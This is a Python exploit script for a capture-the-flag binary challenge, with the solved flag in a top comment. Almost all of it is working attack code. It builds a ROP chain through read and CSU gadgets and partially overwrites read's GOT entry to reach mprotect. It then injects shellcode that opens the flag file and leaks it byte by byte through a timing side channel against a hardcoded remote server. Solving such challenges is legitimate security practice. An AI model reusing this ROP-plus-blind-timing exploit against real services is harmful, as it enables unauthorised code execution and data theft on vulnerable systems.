# flag{even_black_holes_leak_information_by_Hawking_radiation}

from pwnlib import *
from hashlib import sha256
import random
import string
import time
import os

LOCAL = False

#raw_input("> ")

pop_ret = 0x400A4A
shellcode_addr = 0x601c60
read_got_addr = 0x601048
call_gadget = 0x400A30
leave_ret = 0x4009C6


def make_payload(shellcode):

	payload = ""
	payload += "A"*0x28

	# call    qword ptr [r12+rbx*8]

	# do a read
	payload += pq(pop_ret)
	payload += pq(0) # rbx
	payload += pq(1) # rbp
	payload += pq(read_got_addr) # r12
	payload += pq(0x200) # r13 -> rdx
	payload += pq(shellcode_addr) # r14 -> rsi
	payload += pq(0) # r15 -> edi
	payload += pq(call_gadget)

	payload += pq(0xdede)*2
	payload += pq(shellcode_addr) # rbp
	payload += pq(0xdede)*4
	payload += pq(leave_ret)

	payload += "A"*(0x100 - len(payload))

	assert (len(payload) == 0x100)
	final = payload


	# do another read, but a small one
	payload  = pq(0xcaffee) # rbp
	payload += pq(pop_ret)
	payload += pq(0) # rbx
	payload += pq(1) # rbp
	payload += pq(read_got_addr) # r12
	payload += pq(2) # r13 -> rdx
	payload += pq(read_got_addr) # r14 -> rsi
	payload += pq(0) # r15 -> edi
	payload += pq(call_gadget)

	payload += pq(0xd1d1)*7

	# then do yet another read, although it's really an mprotect now.
	payload += pq(pop_ret)
	payload += pq(0) # rbx
	payload += pq(1) # rbp
	payload += pq(read_got_addr) # r12
	payload += pq(7) # r13 -> rdx
	payload += pq(0x1000) # r14 -> rsi
	payload += pq(0x601000) # r15 -> edi
	payload += pq(call_gadget)

	payload += pq(0xd1d1)*7
	payload += pq(0x601d60) # addr of the following

	payload += shellcode

	payload += "A"*(0x200 - len(payload))
	assert (len(payload) == 0x200)
	final += payload

	final += "\xd0\xb4"

	return final


def attempt(shellcode):
	final = make_payload(shellcode)

	if LOCAL:
		s = Socket(("localhost", 1710))
		s.send(final)
	else:
		s = Socket(("202.120.7.203", 666))
		
		chall = s.ru("\n")

		def is_solution(sol):
			return 


		def find_solution():
			print("doing pow: %s" % chall)
			solution = os.popen("./pow %s" % chall).read().strip()
			return solution

		sol = find_solution()
		print("found solution: %s" % sol)

		final += "X"*(0x800 - len(final))


		s.send(sol + final)

	before = time.time()
	x = s.recv()
	total = time.time() - before

	return total >= 9


def is_true(shellcode):
	for i in range(40):
		if attempt(shellcode):
			return True
	return False




def is_lte(offset, value):
	shellcode = assemble("""

mov rsp, 0x601c00

# "flag"
mov rax, 0x67616c66
mov [rsp], rax

# open
mov rax, 2
mov rdi, rsp
xor rsi, rsi
syscall


mov rdi, rax
xor rax, rax
mov rsi, rsp
mov rdx, 0x40
syscall

mov rax, rsp
add rax, %d
mov al, byte [rax]
cmp al, %d
jle loop
jmp bad

loop:
jmp loop

bad:
int3

	""" % (offset, value))
	return is_true(shellcode)



def solve(offset):
	max = 0x7e
	min = 0x20
	while True:
		# both inclusive
		mid = (max + min) / 2
		print("max: 0x%x" % max)
		print("min: 0x%x" % min)
		print("mid: 0x%x" % mid)

		if is_lte(offset, mid):
			max = mid
		else:
			min = mid
		
		if min + 1 == max:
			return max
			

flag = "flag{even_black_holes_leak_information_bXXXXXXin"
for _ in range(32):
	c = solve(len(flag))
	flag += chr(c)
	print("========== Flag: %s ==========" % flag)



